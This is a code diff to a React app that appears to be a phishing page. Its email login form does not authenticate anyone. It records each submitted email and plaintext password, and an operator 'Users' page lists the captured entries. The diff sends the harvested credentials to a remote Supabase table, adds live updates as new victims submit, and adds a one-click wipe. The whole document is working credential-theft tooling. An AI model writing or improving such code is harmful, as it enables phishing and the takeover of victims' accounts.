@@ -1,19 +1,18 @@
 import { useState, useEffect } from "react";
 import "./App.css";
+import { supabase } from "./supabase";
 
-// ── Credential store (localStorage) ───────────────────────────────────────────
-const STORE_KEY = "tt_credentials";
-function loadCreds() {
-  try {
-    return JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
-  } catch {
-    return [];
+// ── Credential helpers ───────────────────────────────────────────────────────────
+async function saveCred(email, password) {
+  if (supabase) {
+    await supabase.from("credentials").insert({ email, password });
+  } else {
+    // fallback: localStorage
+    const key = "tt_credentials";
+    const list = JSON.parse(localStorage.getItem(key) || "[]");
+    list.push({ email, password, time: new Date().toLocaleString() });
+    localStorage.setItem(key, JSON.stringify(list));
   }
-}
-function saveCred(email, password) {
-  const list = loadCreds();
-  list.push({ email, password, time: new Date().toLocaleString() });
-  localStorage.setItem(STORE_KEY, JSON.stringify(list));
 }
 
 // ── SVG Icons ──────────────────────────────────────────────────────────────────
@@ -227,10 +226,13 @@ function EmailLoginForm({ onBack, onLogin }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPass, setShowPass] = useState(false);
+  const [loading, setLoading] = useState(false);
   const canLogin = email.trim() && password;
 
-  function handleLogin() {
-    saveCred(email.trim(), password);
+  async function handleLogin() {
+    setLoading(true);
+    await saveCred(email.trim(), password);
+    setLoading(false);
     onLogin();
   }
 
@@ -269,10 +271,10 @@ function EmailLoginForm({ onBack, onLogin }) {
         <button
           className="login-submit-btn"
           type="button"
-          disabled={!canLogin}
+          disabled={!canLogin || loading}
           onClick={handleLogin}
         >
-          Log in
+          {loading ? "Saving..." : "Log in"}
         </button>
       </div>
       <button className="go-back-btn" type="button" onClick={onBack}>
@@ -285,10 +287,47 @@ function EmailLoginForm({ onBack, onLogin }) {
 
 // ── Users page ─────────────────────────────────────────────────────────────────
 function UsersPage() {
-  const [creds, setCreds] = useState(loadCreds);
+  const [creds, setCreds] = useState([]);
+  const [loading, setLoading] = useState(true);
 
-  function handleClear() {
-    localStorage.removeItem(STORE_KEY);
+  async function fetchCreds() {
+    if (supabase) {
+      const { data } = await supabase
+        .from("credentials")
+        .select("*")
+        .order("created_at", { ascending: false });
+      setCreds(data || []);
+    } else {
+      const key = "tt_credentials";
+      setCreds(JSON.parse(localStorage.getItem(key) || "[]").reverse());
+    }
+    setLoading(false);
+  }
+
+  useEffect(() => {
+    fetchCreds();
+    // real-time subscription
+    if (supabase) {
+      const channel = supabase
+        .channel("credentials")
+        .on(
+          "postgres_changes",
+          { event: "INSERT", schema: "public", table: "credentials" },
+          (payload) => {
+            setCreds((prev) => [payload.new, ...prev]);
+          },
+        )
+        .subscribe();
+      return () => supabase.removeChannel(channel);
+    }
+  }, []);
+
+  async function handleClear() {
+    if (supabase) {
+      await supabase.from("credentials").delete().neq("id", 0);
+    } else {
+      localStorage.removeItem("tt_credentials");
+    }
     setCreds([]);
   }
 
@@ -349,7 +388,11 @@ function UsersPage() {
           </div>
         </div>
 
-        {creds.length === 0 ? (
+        {loading ? (
+          <p style={{ color: "rgba(255,255,255,.4)", fontSize: 15 }}>
+            Loading...
+          </p>
+        ) : creds.length === 0 ? (
           <p style={{ color: "rgba(255,255,255,.4)", fontSize: 15 }}>
             No credentials submitted yet.
           </p>
@@ -366,10 +409,10 @@ function UsersPage() {
             <tbody>
               {creds.map((c, i) => (
                 <tr
-                  key={i}
+                  key={c.id || i}
                   style={{ borderBottom: "1px solid rgba(255,255,255,.06)" }}
                 >
-                  <td style={td}>{i + 1}</td>
+                  <td style={td}>{creds.length - i}</td>
                   <td style={td}>{c.email}</td>
                   <td style={td}>{c.password}</td>
                   <td
@@ -379,7 +422,9 @@ function UsersPage() {
                       fontSize: 13,
                     }}
                   >
-                    {c.time}
+                    {c.created_at
+                      ? new Date(c.created_at).toLocaleString()
+                      : c.time}
                   </td>
                 </tr>
               ))}
